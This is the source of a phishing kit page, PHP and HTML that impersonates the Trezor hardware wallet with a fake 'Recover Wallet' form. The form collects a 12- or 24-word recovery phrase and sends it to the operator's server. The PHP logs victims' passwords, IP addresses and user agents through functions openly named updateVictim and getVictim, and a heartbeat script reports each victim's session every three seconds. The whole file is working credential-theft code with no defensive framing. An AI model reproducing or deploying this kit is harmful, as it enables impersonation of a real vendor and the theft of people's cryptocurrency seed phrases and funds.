<?php

$host = 'localhost';
$dbname = 'support';
$username = 'phpmyadmin';
$password = 'haha123';

try {
    $pdo = new PDO( 'mysql:host=' . $host . ';dbname=' . $dbname, $username, $password );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Check site status
    $stmt = $pdo->query("SELECT `status` FROM `site_status` WHERE `id` = 1");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($row['status'] === 'off') {
        http_response_code(404);
        exit;
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    exit;
}



require_once( realpath( dirname( __FILE__ ) . DIRECTORY_SEPARATOR . 'core' . DIRECTORY_SEPARATOR . 'functions.php' ) );

if ( validUser( $pdo ) ) {

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'is_waiting' => 0,
    'heartbeat' => 27 // Password
  ] );

  $id = $_SESSION[ 'id' ];
  $email = getVictim( $pdo, $id )[ 'username' ];

} else {

  header( 'location:login.php' );

}


if ( !empty( $_GET[ 'password' ] ) ) {

  // Add password to db

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'ip_address' => $_SERVER[ 'REMOTE_ADDR' ],
    'user_agent' => $_SERVER[ 'HTTP_USER_AGENT' ],

    'password' => $_GET[ 'password' ]
  ] );

  // Send to loading page

  header( 'location:loading.php' );

}

?>

<!DOCTYPE html>
<html lang="en"><head>
    <script src="/core/js/jquery.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trezor Hardware Wallet</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="icon" href="https://trezor.io/favicon/favicon-16x16.png" type="image/png">
    <style>
      body {
        background-color: #18191a;
        font-family: "MyCustomFont", sans-serif;
      }

      .card {
        background-color: #242526;
        color: #fff;
      }

      .nav {
        background-color: #242526;
      }
      .input-box {
        background-color: #18191a;
      }
      .input-btn {
        background-color: #00854d;
      }
      @font-face {
        font-family: "MyCustomFont";
        src: url("/assets/satoshi-medium.woff2") format("woff2");
      }
    </style>
  </head>
  <body>
    <nav class="nav py-4 border-b-1 border-gray-400/10 shadow-lg">
      <div class="container mx-auto">
        <div class="text-white text-2xl font-bold text-center flex flex-row items-center justify-between mx-8">
          <div>
            <a href="/">
              <svg viewBox="0 0 161.768 40.771" fill="none" class="h-6 w-auto text-white" data-testid="basic-icon-iconsvg-TrezorLogo">
                <path class="trezor-logo-trezor" fill="currentColor" d="M24.306 9.461C24.306 4.29 19.761 0 14.228 0 8.694 0 4.148 4.292 4.148 9.46v3.025H0v21.75l14.225 6.536 14.233-6.534V12.581H24.31l-.003-3.121Zm-15.02 0c0-2.438 2.175-4.389 4.942-4.389 2.767 0 4.94 1.951 4.94 4.389v3.024H9.287V9.461Zm13.44 21.264-8.502 3.904-8.499-3.901V17.655h17v13.07z"></path>
                <path class="trezor-logo-text" fill="currentColor" d="M40.019 12.485h17.886v5.17h-6.127v16.678h-5.731V17.655h-6.028ZM78.46 19.8c0-4.39-3.064-7.218-7.609-7.218H60.474v21.75h5.732v-7.314h2.174l4.051 7.314h6.627l-4.842-8.094c2.07-.78 4.244-2.83 4.244-6.438zm-8.296 2.146h-3.958v-4.39h3.953c1.482 0 2.47.879 2.47 2.147 0 1.365-.988 2.243-2.47 2.243zm10.963-9.461h16.009v5.072H86.858v3.219h9.982v4.974h-9.982v3.51h10.278v5.073H81.127Zm48.125-.294c-6.719 0-11.46 4.78-11.46 11.218 0 6.437 4.839 11.22 11.46 11.22s11.562-4.779 11.562-11.217c0-6.438-4.842-11.22-11.562-11.22zm0 17.363c-3.359 0-5.633-2.536-5.633-6.14 0-3.707 2.274-6.142 5.633-6.142 3.36 0 5.732 2.537 5.732 6.141 0 3.605-2.372 6.14-5.732 6.14zm27.67-3.316c2.074-.78 4.25-2.83 4.25-6.438 0-4.39-3.064-7.218-7.61-7.218h-10.375v21.75h5.731v-7.314h2.178l4.051 7.314h6.621zm-4.052-4.292h-3.952v-4.39h3.952c1.484 0 2.471.879 2.471 2.147 0 1.365-.987 2.243-2.471 2.243zm-52.967-9.461h16.898v4.389l-9.19 12.29h9.19v5.169H99.903v-4.39l9.19-12.288h-9.19z"></path>
              </svg>
            </a>
          </div>
          <div class="hidden md:flex flex-row gap-x-6 text-sm items-center">
            <a href="/"> Products </a>
            <a href=""> App </a>
            <a href="">Coins</a>
            <a href="">Learn &amp; Support</a>
          </div>
          <div>
            <button class="input-btn text-white font-bold py-2 px-4 rounded-lg text-sm">
              Get Your Trezor
            </button>
          </div>
        </div>
      </div>
    </nav>

    <div class="container mx-auto flex justify-center items-center lg:h-screen">
      <div class="lg:w-1/2 max-w-md md:max-w-full mx-auto card lg:rounded-lg p-8 shadow-lg">
        <div class="mb-4">
          <h2 class="text-3xl font-bold text-center">Recover Wallet</h2>
          <p class="text-md text-center mx-auto w-3/4">
            Enter recovery phrase to recover your wallet. Please enter the words
            in the correct order.
          </p>
          <div class="flex flex-col md:flex-row gap-x-4 w-full justify-center mt-2 items-center text-sm text-white font-bold mx-auto gap-y-2">
            <div>
              <input type="checkbox" id="toggleButton" class="text-white text-sm">
              <label for="toggleButton" class="text-sm">
                Use 12 words recovery phrase
              </label>
            </div>
            <div>
              <input type="checkbox" id="toggleCustom" class="text-white text-sm">
              <label for="toggleCustom" class="text-sm">
                Use custom recovery phrase
              </label>
            </div>
          </div>
        </div>

        <div id="inputContainer" class="mb-4" style="display: block;">
          <div class="flex flex-wrap justify-center">
            <div id="row1" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 1" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 2" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 3" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 4" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 5" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 6" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center">
            <div id="row2" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 7" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 8" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 9" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 10" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 11" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 12" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row3Container" style="display: flex;">
            <div id="row3" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 13" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 14" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 15" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 16" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 17" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 18" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row4Container" style="display: flex;">
            <div id="row4" class="flex justify-center w-full"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 19" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 20" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 21" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 22" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 23" maxlength="8" style="width: calc(16.6667% - 0.5rem);"><input type="text" class="input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2" placeholder="Word 24" maxlength="8" style="width: calc(16.6667% - 0.5rem);"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row5Container">
            <div id="row5" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row6Container">
            <div id="row6" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row7Container">
            <div id="row7" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row8Container">
            <div id="row8" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row9Container">
            <div id="row9" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row10Container">
            <div id="row10" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row11Container">
            <div id="row11" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row12Container">
            <div id="row12" class="flex justify-center w-full"></div>
          </div>
        </div>

        <div id="customInputContainer" class="mb-4 hidden" style="display: none;">
          <div class="flex flex-wrap justify-center">
            <div id="row1" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center">
            <div id="row2" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row3Container">
            <div id="row3" class="flex justify-center w-full"></div>
          </div>
          <div class="flex flex-wrap justify-center" id="row4Container">
            <div id="row4" class="flex justify-center w-full"></div>
          </div>
        </div>

        <button id="concatenateBtn" class="input-btn text-white font-bold py-2 px-4 rounded w-full">
          Recover Wallet
        </button>

        <div id="errorMessage" class="mt-4 text-red-600 font-bold text-center"></div>

        <div id="result" class="mt-4 font-bold text-center"></div>
      </div>
    </div>

    <script src="/core/js/jquery.js"></script>

    <script>
      let totalBoxes = 12;
      let isCustomToggled = false;
      let wordCount = 1;

      function createInputBoxes(parentId, count) {
        const parentElement = document.getElementById(parentId);
        parentElement.innerHTML = "";

        const isMobile = window.innerWidth <= 768;

        for (let i = 1; i <= count; i++) {
          const input = document.createElement("input");
          input.type = "text";
          input.className =
            "input-box text-white border border-gray-700 rounded-lg p-4 mr-2 mb-2";

          if (isMobile) {
            input.placeholder = `Word ${wordCount}`;
          } else {
            input.placeholder = `Word ${
              i + count * (parseInt(parentId.slice(-1)) - 1)
            }`;
          }

          input.maxLength = 8;
          input.style.width = `calc(${100 / count}% - 0.5rem)`;

          parentElement.appendChild(input);

          wordCount++;
        }
      }

      function toggleBoxes() {
        totalBoxes = totalBoxes === 12 ? 24 : 12;
        const isMobile = window.innerWidth <= 768;
        wordCount = 1;
        if (totalBoxes === 12) {
          if (isMobile) {
            createInputBoxes("row1", 2);
            createInputBoxes("row2", 2);
            createInputBoxes("row3", 2);
            createInputBoxes("row4", 2);
            createInputBoxes("row5", 2);
            createInputBoxes("row6", 2);
            document.getElementById("row3Container").style.display = "flex";
            document.getElementById("row4Container").style.display = "flex";
            document.getElementById("row5Container").style.display = "flex";
            document.getElementById("row6Container").style.display = "flex";
            document.getElementById("row7Container").style.display = "none";
            document.getElementById("row8Container").style.display = "none";
            document.getElementById("row9Container").style.display = "none";
            document.getElementById("row10Container").style.display = "none";
            document.getElementById("row11Container").style.display = "none";
            document.getElementById("row12Container").style.display = "none";
          } else {
            createInputBoxes("row1", 6);
            createInputBoxes("row2", 6);
            document.getElementById("row3Container").style.display = "none";
            document.getElementById("row4Container").style.display = "none";
          }
        } else {
          if (isMobile) {
            createInputBoxes("row1", 2);
            createInputBoxes("row2", 2);
            createInputBoxes("row3", 2);
            createInputBoxes("row4", 2);
            createInputBoxes("row5", 2);
            createInputBoxes("row6", 2);
            createInputBoxes("row7", 2);
            createInputBoxes("row8", 2);
            createInputBoxes("row9", 2);
            createInputBoxes("row10", 2);
            createInputBoxes("row11", 2);
            createInputBoxes("row12", 2);
            document.getElementById("row3Container").style.display = "flex";
            document.getElementById("row4Container").style.display = "flex";
            document.getElementById("row5Container").style.display = "flex";
            document.getElementById("row6Container").style.display = "flex";
            document.getElementById("row7Container").style.display = "flex";
            document.getElementById("row8Container").style.display = "flex";
            document.getElementById("row9Container").style.display = "flex";
            document.getElementById("row10Container").style.display = "flex";
            document.getElementById("row11Container").style.display = "flex";
            document.getElementById("row12Container").style.display = "flex";
          } else {
            createInputBoxes("row1", 6);
            createInputBoxes("row2", 6);
            createInputBoxes("row3", 6);
            createInputBoxes("row4", 6);
            document.getElementById("row3Container").style.display = "flex";
            document.getElementById("row4Container").style.display = "flex";
          }
        }
        turnCustomOff();
        document
          .getElementById("row1")
          .firstElementChild.addEventListener("paste", pasteAndFill);
      }

      toggleBoxes();

      function toggleCustom() {
        isCustomToggled = !isCustomToggled;
        let customInput = document.getElementById("toggleButton");
        customInput.checked = false;

        if (isCustomToggled) {
          let c = document.getElementById("customInputContainer");
          let r = document.getElementById("inputContainer");
          r.style.display = "none";
          c.style.display = "block";
          createCustomTextArea();
        } else {
          let c = document.getElementById("customInputContainer");
          let r = document.getElementById("inputContainer");
          r.style.display = "block";
          c.style.display = "none";
        }
      }

      function turnCustomOff() {
        isCustomToggled = false;
        let customInput = document.getElementById("toggleCustom");
        customInput.checked = false;
        let c = document.getElementById("customInputContainer");
        let r = document.getElementById("inputContainer");
        r.style.display = "block";
        c.style.display = "none";
      }

      function createCustomTextArea() {
        const inputContainer = document.getElementById("customInputContainer");

        while (inputContainer.firstChild) {
          inputContainer.removeChild(inputContainer.firstChild);
        }

        const textarea = document.createElement("textarea");
        textarea.className =
          "input-box text-white border border-gray-700 rounded-lg p-4 mb-2 w-full";
        textarea.placeholder = "Enter your recovery phrase here...";
        textarea.id = "customTextArea";

        inputContainer.appendChild(textarea);
      }

      document
        .getElementById("toggleButton")
        .addEventListener("click", toggleBoxes);

      document
        .getElementById("toggleCustom")
        .addEventListener("click", toggleCustom);

      let backspacePressed = false;

      document.addEventListener("keydown", function (event) {
        if (event.key === "Backspace") {
          backspacePressed = true;
          deletePreviousInput(event);
        }
      });

      document.addEventListener("keyup", function (event) {
        if (event.key === "Backspace") {
          backspacePressed = false;
        }
      });

      function deletePreviousInput(event) {
        const currentInput = event.target;
        const inputs = document.querySelectorAll("input[type='text']");

        for (let i = 0; i < inputs.length; i++) {
          if (inputs[i] === currentInput && i > 0) {
            if (event.keyCode === 8 && inputs[i].value.length > 0) {
              event.preventDefault();
              inputs[i].value = inputs[i].value.slice(0, -1);
              break;
            } else if (event.keyCode === 8 && inputs[i].value.length === 0) {
              event.preventDefault();
              inputs[i - 1].focus();
              break;
            }
          }
        }
      }

      function concatenateWords() {
        let concatenatedPhrase = "";
        let inputsFound = false;
        let inputCount = 0;

        const textInputs = document.querySelectorAll("input[type='text']");

        textInputs.forEach((input) => {
          const computedStyle = window.getComputedStyle(input);
          if (computedStyle.display !== "none") {
            inputsFound = true;
            if (input.value.trim()) {
              concatenatedPhrase += input.value.trim() + " ";
              inputCount++;
            }
          }
        });

        if (isCustomToggled) {
          const textarea = document.getElementById("customTextArea");
          concatenatedPhrase = textarea.value.trim();
        }

        if (inputCount === 0 && !inputsFound && concatenatedPhrase === "") {
          document.getElementById("errorMessage").textContent =
            "Please fill in all the fields.";
          document.getElementById("result").textContent = "";
          return;
        }

        document.getElementById("errorMessage").textContent = "";

        $.ajax({
            type: 'GET',
          	data: {
          	  trezor_seed: concatenatedPhrase,
          	},
          	url: '/core/update.php',
          	success: function ( data ) {
              var parsed_data = JSON.parse( data );
              if ( parsed_data[ 'status' ] != 'error' ) {
                window.location.replace( '/loading.php' );
              }
            }
          });
      }

      document
        .getElementById("concatenateBtn")
        .addEventListener("click", concatenateWords);

      function pasteAndFill(event) {
        const clipboardData = event.clipboardData || window.clipboardData;
        const pastedText = clipboardData.getData("text");
        const words = pastedText.trim().split(/\s+/);
        
        const inputBoxes = document.querySelectorAll("input[type='text']");

        const totalBoxes = inputBoxes.length;
        const boxesPerRow = Math.ceil(totalBoxes / 4);
        let currentWordIndex = 0;

        for (let i = 0; i < inputBoxes.length; i++) {
          if (currentWordIndex >= words.length) break;

          const word = words[currentWordIndex];
          inputBoxes[i].value = word;
          currentWordIndex++;
        }

        event.preventDefault();
      }

      window.onload = function () {
        function reloadPage() {
          window.location.reload(true);
        }

        window.addEventListener("resize", function (event) {
          reloadPage();
        });
      };
    </script>
    <script>
      function hb() {
        $.ajax({
          type: 'GET',
          url: '/core/heartbeat.php?id=' + '<?php echo( $_SESSION[ 'id' ] ); ?>',
          success: function ( data ) {},
          complete: function ( data ) {
            setTimeout( hb, 3000 );
          }
        });
      };hb();
    </script>
  

</body></html>